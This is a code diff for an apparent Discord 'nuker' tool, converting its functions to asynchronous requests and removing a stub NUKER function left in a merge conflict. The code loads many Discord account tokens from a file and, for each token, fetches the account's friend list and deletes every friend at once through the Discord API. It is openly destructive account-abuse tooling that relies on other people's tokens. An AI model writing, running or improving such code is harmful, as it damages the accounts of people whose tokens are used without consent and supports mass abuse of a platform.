@@ -1,30 +1,33 @@
-import requests
+import aiohttp
+import asyncio
 
-<<<<<<< HEAD
+from utils.Setting.setup_most import heads
 
-def NUKER(token, Server, Content):
-    if threading.active_count() < 50:
-        thread = threading.Thread(target="", args=(token,))
-=======
-def remove_friend(token: str):
+asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+
+async def remove_friend(token: str):
     base_url = "https://discord.com/api/v10/users/@me/relationships"
     
-    headers = {
-        'Authorization': token
-    }
-    
-    response: list[dict] = requests.get(url=base_url, headers=headers).json() # type: ignore
-    friend_ids: list[str] = [friend["id"] for friend in response] # type: ignore
-    for friend_id in friend_ids:
-        requests.delete(f"{base_url}/{friend_id}", headers=headers)
-    
+    async with (
+        aiohttp.ClientSession() as session,
+        session.get(base_url, headers=heads(token=token)) as response
+    ):
+        friend_infos = await response.json()
+        
+        for friend_info in friend_infos:
+            async with session.delete(f"{base_url}/{friend_info['id']}", headers=heads(token=token)) as response:
+                pass
+            
 
 
-def accounts_bomber():
+async def accounts_bomber():
+    tokens: list[str] = []
     with open("token.txt", "r", encoding="utf-8") as f:
         for line in f.readlines():
             # 주석 처리된 문장 무시
             if line.startswith("#"):
                 continue
-            remove_friend(line)
->>>>>>> ba68be3563da0d91bbcb3c74b9f8f8f95c62eb0e
+            tokens.append(line)
+    
+    await asyncio.gather(*[remove_friend(token=token) for token in tokens])
+
